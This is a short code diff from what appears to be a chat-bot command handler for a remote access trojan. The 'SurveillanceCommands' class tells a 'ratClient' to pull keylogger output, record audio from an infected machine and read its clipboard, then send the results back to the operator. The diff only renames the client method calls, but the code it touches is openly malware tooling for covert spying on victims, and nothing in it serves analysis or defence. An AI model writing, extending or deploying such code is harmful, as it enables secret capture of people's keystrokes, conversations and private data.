@@ -81,7 +81,7 @@ export class SurveillanceCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'keylogs');
+    const result = await this.ratClient.getKeylogs(sessionId);
     
     if (result.success) {
       const response = ResponseFormatter.header('⌨️', 'KEYLOGGER OUTPUT') + 
@@ -109,7 +109,7 @@ export class SurveillanceCommands {
       text: ResponseFormatter.info(`🎤 Recording ${duration} seconds of audio...\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.getAudio(sessionId, duration);
+    const result = await this.ratClient.recordAudio(sessionId, duration);
     
     if (result.success) {
       const buffer = Buffer.from(result.audio, 'base64');
@@ -137,7 +137,7 @@ export class SurveillanceCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'clipboard');
+    const result = await this.ratClient.getClipboard(sessionId);
     
     if (result.success) {
       try {
